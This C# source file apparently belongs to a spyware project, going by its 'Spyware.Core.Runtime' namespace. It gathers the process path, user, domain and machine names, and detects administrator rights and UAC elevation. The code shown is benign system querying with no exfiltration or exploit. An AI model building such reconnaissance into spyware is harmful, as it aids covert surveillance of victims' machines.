using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Spyware.Core.Runtime;

public static class ProcessContext
{
    private const int TokenElevation = 20;

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetTokenInformation(
        IntPtr tokenHandle, int tokenInformationClass, IntPtr tokenInformation, int tokenInformationLength, out int returnLength);

    public static int ProcessId => Environment.ProcessId;

    public static string ExecutablePath =>
        Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName ?? string.Empty;

    public static string ExecutableDirectory =>
        string.IsNullOrEmpty(ExecutablePath) ? AppContext.BaseDirectory : Path.GetDirectoryName(ExecutablePath)!;

    public static string UserName => Environment.UserName;
    public static string DomainName => Environment.UserDomainName;
    public static string MachineName => Environment.MachineName;
    public static int SessionId => Process.GetCurrentProcess().SessionId;

    public static bool IsAdministratorUser()
    {
        try
        {
            using WindowsIdentity identity = WindowsIdentity.GetCurrent();
            return new WindowsPrincipal(identity).IsInRole(WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    /// <summary>Con UAC, un administrador corre con token filtrado: IsElevated = false.</summary>
    public static bool IsElevated()
    {
        try
        {
            using WindowsIdentity identity = WindowsIdentity.GetCurrent();
            IntPtr token = identity.Token;
            IntPtr buffer = Marshal.AllocHGlobal(sizeof(int));
            try
            {
                if (!GetTokenInformation(token, TokenElevation, buffer, sizeof(int), out _))
                    return IsAdministratorUser();

                return Marshal.ReadInt32(buffer) != 0;
            }
            finally { Marshal.FreeHGlobal(buffer); }
        }
        catch { return false; }
    }

    public static string DescribeToken()
    {
        if (IsElevated()) return "elevado";
        return IsAdministratorUser() ? "administrador con UAC (token filtrado)" : "usuario estándar";
    }
}
